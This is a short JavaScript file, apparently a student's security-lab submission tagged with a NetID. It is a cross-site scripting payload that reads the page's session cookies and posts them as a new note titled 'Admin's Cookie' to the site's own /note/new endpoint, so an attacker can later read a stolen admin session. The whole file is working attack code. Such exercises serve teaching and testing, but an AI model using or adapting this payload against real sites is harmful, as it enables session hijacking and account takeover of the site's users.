// NetID; yc5109

// Attempting to Get Session Cookies
const currentCookies = document.cookie;
console.log(currentCookies);

// New Form Data Generation
const formData = new FormData();
formData.append("title", "Admin's Cookie");
formData.append("content", currentCookies);

const request = new XMLHttpRequest();
request.open("POST", "/note/new");
request.send(formData);
